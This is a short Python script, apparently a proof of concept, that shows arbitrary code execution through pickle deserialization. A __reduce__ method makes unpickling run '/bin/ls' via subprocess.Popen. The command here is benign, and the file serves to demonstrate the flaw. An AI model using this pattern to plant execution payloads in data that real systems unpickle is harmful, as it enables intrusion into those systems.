#!/usr/bin/env python

class Payload(object):
    """ Executes /bin/ls when unpickled. """
    def __reduce__(self):
        import subprocess
        """ Run /bin/ls on the remote machine. """
        return (subprocess.Popen, (('/bin/ls',),))

import pickle
s = pickle.dumps(Payload())
pickle.loads(s)
